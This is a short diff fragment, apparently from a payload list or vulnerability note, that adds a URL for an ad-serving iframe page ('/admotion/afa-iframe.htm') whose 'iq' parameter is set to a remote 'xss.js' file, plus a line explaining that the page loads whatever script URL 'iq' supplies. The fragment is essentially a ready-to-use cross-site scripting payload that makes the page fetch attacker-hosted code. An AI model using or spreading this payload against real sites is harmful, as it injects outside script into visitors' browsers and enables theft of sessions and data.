@@ -1,0 +1,3 @@
+/admotion/afa-iframe.htm?iq=https://bgtian.life/xss.js
+
+The script get the "iq" parameter in the url then load "(args.iq || 'http://ia.nspmotion.com/delivery/')"
